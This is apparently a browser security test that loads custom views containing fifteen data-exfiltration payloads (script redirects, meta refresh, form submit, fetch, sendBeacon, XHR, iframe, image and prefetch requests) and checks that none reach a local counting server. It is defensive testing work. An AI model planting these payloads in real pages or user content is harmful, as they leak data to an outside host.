// A view cannot send data out by navigating (itself, its parent, a new window) or by any request: a counting server on
// 127.0.0.1 must see ZERO hits from every vector. Real Chrome, isolated Coral (see run_cdp_suites.mjs).
const assert = require('node:assert/strict');
const http = require('node:http');
const CDP = require('chrome-remote-interface');
const base = process.env.CORAL_URL;
if (!base || /:8420(\/|$)/.test(base)) throw Error('Use isolated server');
(async () => {
    const hits = [];
    const server = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Content-Type': 'text/html' }).end('<h1>exfil</h1>'); });
    await new Promise(r => server.listen(0, '127.0.0.1', r));
    const URLX = `http://127.0.0.1:${server.address().port}/leak?d=secret`;
    const c = await CDP({ port: Number(process.env.CDP_PORT || 9222) });
    const ev = async expression => {
        const r = await c.Runtime.evaluate({ expression, returnByValue: true, awaitPromise: true });
        if (r.exceptionDetails) throw Error(r.exceptionDetails.exception?.description || r.exceptionDetails.text);
        return r.result.value;
    };
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const vectors = {
        'location.href': `<script>location.href='${URLX}'</script>`,
        'location.replace': `<script>document.location.replace('${URLX}')</script>`,
        'meta refresh': `<meta http-equiv="refresh" content="0;url=${URLX}">`,
        'window.open': `<script>window.open('${URLX}')</script>`,
        'form submit': `<form id="f" action="${URLX}" method="get"><input name="x" value="1"></form><script>document.getElementById('f').submit()</script>`,
        'link click': `<a id="a" href="${URLX}">x</a><script>document.getElementById('a').click()</script>`,
        'link target blank': `<a id="a" target="_blank" href="${URLX}">x</a><script>document.getElementById('a').click()</script>`,
        'parent.location': `<script>try { parent.location = '${URLX}'; } catch (e) {}</script>`,
        'top.location': `<script>try { top.location = '${URLX}'; } catch (e) {}</script>`,
        'iframe src': `<iframe src="${URLX}"></iframe>`,
        'img src': `<script>new Image().src='${URLX}'</script>`,
        'fetch': `<script>fetch('${URLX}', {mode:'no-cors'}).catch(function(){})</script>`,
        'sendBeacon': `<script>navigator.sendBeacon('${URLX}', 'x')</script>`,
        'xhr': `<script>var x=new XMLHttpRequest();x.open('GET','${URLX}');x.send()</script>`,
        'link prefetch': `<link rel="prefetch" href="${URLX}"><link rel="stylesheet" href="${URLX}">`,
    };
    const names = Object.keys(vectors);
    try {
        await c.Page.enable();
        await c.Page.navigate({ url: base }); await c.Page.loadEventFired();
        await ev(`(async () => {
            window.cv = await import('/static/custom_views.js');
            const views = ${JSON.stringify(names.map((n, i) => ({ id: 300 + i, name: n, html: vectors[n], created_via: 'ui' })))};
            const real = window.fetch.bind(window);
            window.fetch = async (url, init) => { const u = new URL(url, location.origin); if (u.pathname === '/api/views') return new Response(JSON.stringify(views), { headers: { 'Content-Type': 'application/json' } }); return real(url, init); };
            document.body.insertAdjacentHTML('beforeend', '<div id="custom-view-tabs"></div><div id="custom-view-panels"></div>');
            await cv.loadCustomViews();
        })()`);
        for (let i = 0; i < names.length; i++) {
            const before = hits.length;
            await ev(`cv.activateCustomView(${300 + i})`);
            await sleep(900);
            assert.equal(hits.length, before, `vector "${names[i]}" reached the counting server: ${JSON.stringify(hits.slice(before))}`);
        }
        assert.deepEqual(hits, [], 'no request left any view');
        // A view that navigates is stopped and the user is told.
        const stopped = await ev(`document.querySelector('#agentic-panel-custom-view-300')?.textContent || ''`);
        console.log('custom_views_navigation_browser.test.js: ok (' + names.length + ' vectors, 0 hits; first view panel: ' + JSON.stringify(stopped.slice(0, 70)) + ')');
    } finally { await c.close(); server.close(); }
})().catch(e => { console.error(e); process.exit(1); });
